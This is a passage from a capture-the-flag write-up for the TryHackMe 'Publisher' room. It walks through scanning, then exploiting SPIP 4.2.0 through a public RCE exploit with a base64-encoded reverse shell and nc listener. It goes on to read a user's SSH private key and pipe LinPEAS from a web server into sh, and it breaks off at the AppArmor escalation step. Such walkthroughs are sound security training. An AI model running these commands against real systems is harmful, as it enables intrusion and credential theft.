<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-writeups/thm/publisher/index" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.4.0">
<title data-rh="true">Publisher | Francesco Pastore</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://2h3ph3rd.github.io/docs/writeups/thm/publisher"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Publisher | Francesco Pastore"><meta data-rh="true" name="description" content="A writeup for the room Publisher on TryHackMe."><meta data-rh="true" property="og:description" content="A writeup for the room Publisher on TryHackMe."><link data-rh="true" rel="icon" href="/images/favicon.ico"><link data-rh="true" rel="canonical" href="https://2h3ph3rd.github.io/docs/writeups/thm/publisher"><link data-rh="true" rel="alternate" href="https://2h3ph3rd.github.io/docs/writeups/thm/publisher" hreflang="en"><link data-rh="true" rel="alternate" href="https://2h3ph3rd.github.io/docs/writeups/thm/publisher" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Francesco Pastore RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Francesco Pastore Atom Feed">





<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/styles.4b3984a8.css">
<script src="/assets/js/runtime~main.0310628e.js" defer="defer"></script>
<script src="/assets/js/main.17006c16.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/images/logo.png" alt="Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/images/logo.png" alt="Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Francesco Pastore</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/writeups">üìù Writeups</a><a class="navbar__item navbar__link" href="/resources">üîó Resources</a><a href="https://2h3ph3rd.medium.com" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">üì∞ Blog<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/2h3ph3rd/2h3ph3rd.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Source<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><a href="https://github.com/2h3ph3rd" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/writeups">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/writeups/htb/analytics">üì¶ HTB</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/writeups/thm/airplane">‚òÅÔ∏è THM</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/airplane">Airplane</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/cat-pictures-2">Cat Pictures 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/clocky">Clocky</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/compiled">Compiled</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/crylo">Crylo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/devie">Devie</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/dreaming">Dreaming</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/flip">Flip</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/hijack">Hijack</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/include">Include</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/mkingdom">mKingdom</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/mother">Mother</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/pickle-rick">Pickle Rick</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/probe">Probe</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/writeups/thm/publisher">Publisher</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/traverse">Traverse</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/writeups/thm/w1seguy">W1seGuy</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">‚òÅÔ∏è THM</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Publisher</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Publisher</h1>
<p>A writeup for the room <a href="https://tryhackme.com/r/room/publisher" target="_blank" rel="noopener noreferrer">Publisher</a> on TryHackMe.</p>
<blockquote>
<p>Test your enumeration skills on this boot-to-root machine.</p>
</blockquote>
<p align="center"><a href="/assets/images/logo-f8dbe7afeac2cc803424aac18a826337.webp" target="_blank" class="no-link"><img src="/assets/images/logo-f8dbe7afeac2cc803424aac18a826337.webp" width="auto" height="256" class="zoom-effect"></a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-user-flag">What is the user flag?<a class="hash-link" aria-label="Direct link to What is the user flag?" title="Direct link to What is the user flag?" href="/docs/writeups/thm/publisher#what-is-the-user-flag">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="nmap-scan">Nmap scan<a class="hash-link" aria-label="Direct link to Nmap scan" title="Direct link to Nmap scan" href="/docs/writeups/thm/publisher#nmap-scan">‚Äã</a></h3>
<p>We can start by scanning the target with Nmap:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap </span><span class="token parameter variable" style="color:#36acaa">-sS</span><span class="token plain"> TARGET_IP</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The scan reveals two open ports: 22 (SSH) and 80 (HTTP).</p>
<p align="center"><a href="/assets/images/1-1-nmap-4175f390ca17f6f293af3cbe784b6b29.webp" target="_blank" class="no-link"><img src="/assets/images/1-1-nmap-4175f390ca17f6f293af3cbe784b6b29.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web-server-enumeration">Web server enumeration<a class="hash-link" aria-label="Direct link to Web server enumeration" title="Direct link to Web server enumeration" href="/docs/writeups/thm/publisher#web-server-enumeration">‚Äã</a></h3>
<p>We can start by visiting the web server at <code>http://TARGET_IP</code>. The page is a simple blog with a few posts.</p>
<p>There isn&#x27;t much to see here and most of the links are dead.</p>
<p>However, we can notice that in many places there are references to <code>SPIP</code>, which is a content management system (CMS).</p>
<p align="center"><a href="/assets/images/1-2-home-f921a49568392d046540d8defadbd1b6.webp" target="_blank" class="no-link"><img src="/assets/images/1-2-home-f921a49568392d046540d8defadbd1b6.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<p>We can use <code>gobuster</code> to enumerate the web server for hidden directories.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gobuster </span><span class="token function" style="color:#d73a49">dir</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> http://TARGET_IP </span><span class="token parameter variable" style="color:#36acaa">-w</span><span class="token plain"> /usr/share/seclists/Discovery/Web-Content/big.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The scan reveals a few interesting directories, including <code>/images</code> and <code>/spip</code>.</p>
<p align="center"><a href="/assets/images/1-3-gobuster-70cee61227e83ee1e91d0b1751635f8b.webp" target="_blank" class="no-link"><img src="/assets/images/1-3-gobuster-70cee61227e83ee1e91d0b1751635f8b.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<p align="center"><a href="/assets/images/1-4-images-68732b108ffeb9e40d46abbf4499ef46.webp" target="_blank" class="no-link"><img src="/assets/images/1-4-images-68732b108ffeb9e40d46abbf4499ef46.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<p align="center"><a href="/assets/images/1-5-spip-4bd0a8a094d33f59cb4ad91be27506b7.webp" target="_blank" class="no-link"><img src="/assets/images/1-5-spip-4bd0a8a094d33f59cb4ad91be27506b7.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="searching-for-the-spip-version">Searching for the SPIP version<a class="hash-link" aria-label="Direct link to Searching for the SPIP version" title="Direct link to Searching for the SPIP version" href="/docs/writeups/thm/publisher#searching-for-the-spip-version">‚Äã</a></h3>
<p>Even with the previous enumeration, we didn&#x27;t find anything interesting.</p>
<p>However, now we are sure that the website is running SPIP and there might be a vulnerability in the version used.</p>
<p>There are multiple ways to find the version of SPIP of the website.
A direct approach is to look at the source code of the page, which reveals the version <code>4.2.0</code> inside a meta tag.</p>
<p align="center"><a href="/assets/images/1-6-source-e77cb04060613791c7f3d5577512f6dd.webp" target="_blank" class="no-link"><img src="/assets/images/1-6-source-e77cb04060613791c7f3d5577512f6dd.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-vulnerabilities-in-spip-420">Exploiting vulnerabilities in SPIP 4.2.0<a class="hash-link" aria-label="Direct link to Exploiting vulnerabilities in SPIP 4.2.0" title="Direct link to Exploiting vulnerabilities in SPIP 4.2.0" href="/docs/writeups/thm/publisher#exploiting-vulnerabilities-in-spip-420">‚Äã</a></h3>
<p>We can search for vulnerabilities in SPIP 4.2.0 on the internet.</p>
<p>The exploit 51536 seems to be a good candidate for this version allowing remote code execution.</p>
<p><a href="https://www.exploit-db.com/exploits/51536" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/51536</a></p>
<p>We can download the exploit and run it with the target IP. To avoid issues with special characters, we can use a base64 encoded command.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Testing the exploit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 exploit.py </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> http://TARGET_IP/spip </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;sleep 5&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Running the lister in another terminal</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lvnp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1337</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Running a rev shell by encoding the command in base64</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">REV_SHELL</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$(</span><span class="token variable builtin class-name" style="color:#36acaa">echo</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable string" style="color:#e3116c">&quot;&quot;</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> base64</span><span class="token variable" style="color:#36acaa">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$REV_SHELL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 exploit.py </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> http://TARGET_IP/spip </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;echo </span><span class="token string variable" style="color:#36acaa">$REV_SHELL</span><span class="token string" style="color:#e3116c"> | base64 -d | bash&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p align="center"><a href="/assets/images/1-7-exploit-test-cbc4b30fdefb7f6431bfa55ce2ddceaa.webp" target="_blank" class="no-link"><img src="/assets/images/1-7-exploit-test-cbc4b30fdefb7f6431bfa55ce2ddceaa.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<p align="center"><a href="/assets/images/1-8-exploit-2036c1eaef48a8ef31b8a91ab379170d.webp" target="_blank" class="no-link"><img src="/assets/images/1-8-exploit-2036c1eaef48a8ef31b8a91ab379170d.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-first-flag">Getting the first flag<a class="hash-link" aria-label="Direct link to Getting the first flag" title="Direct link to Getting the first flag" href="/docs/writeups/thm/publisher#getting-the-first-flag">‚Äã</a></h3>
<p>Once inside the server, we can navigate to the home directory of the user <code>thing</code> where we can find the ssh credentials and the user flag.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /home/thing/user.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /home/thing/.ssh/id_rsa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> thing@TARGET_IP</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p align="center"><a href="/assets/images/1-9-revshell-f5f2da891b5fdb18b3a8725165d2c704.webp" target="_blank" class="no-link"><img src="/assets/images/1-9-revshell-f5f2da891b5fdb18b3a8725165d2c704.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-root-flag">What is the root flag?<a class="hash-link" aria-label="Direct link to What is the root flag?" title="Direct link to What is the root flag?" href="/docs/writeups/thm/publisher#what-is-the-root-flag">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="analyzing-with-linpeas">Analyzing with LinPEAS<a class="hash-link" aria-label="Direct link to Analyzing with LinPEAS" title="Direct link to Analyzing with LinPEAS" href="/docs/writeups/thm/publisher#analyzing-with-linpeas">‚Äã</a></h3>
<p>Now that we are inside the server, we can run LinPEAS to find potential privilege escalation vectors.</p>
<p>Be careful, there is no external connection from the server and most of the folder are not writable.</p>
<p>A simple solution is to transfer the script to the server using a webserver and then run it directly on the target.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># On your machine</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> http.server </span><span class="token number" style="color:#36acaa">8000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># On the target machine</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> http://YOUR_IP:8000/linpeas.sh </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sh</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">less</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-R</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can notice that there is a binary run_container with SUID set and that also AppArmor is enabled.</p>
<p>Looking to our current session, we can see that we are in a container and we are not running bash but ash.</p>
<p>This is a shell with limited functionalities based on the AppArmor profile.</p>
<p align="center"><a href="/assets/images/2-1-suid-849cbc6e5dd9ce3839424285f9bf7d75.webp" target="_blank" class="no-link"><img src="/assets/images/2-1-suid-849cbc6e5dd9ce3839424285f9bf7d75.webp" width="auto" height="auto" class="zoom-effect"></a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="method-1-exploiting-the-apparmor-profile">Method 1: Exploiting the AppArmor profile<a class="hash-link" aria-label="Direct link to Method 1: Exploiting the AppArmor profile" title="Direct link to Method 1: Exploiting the AppArmor profile" href="/docs/writeups/thm/publisher#method-1-exploiting-the-apparmor-profile">‚Äã</a></h3>
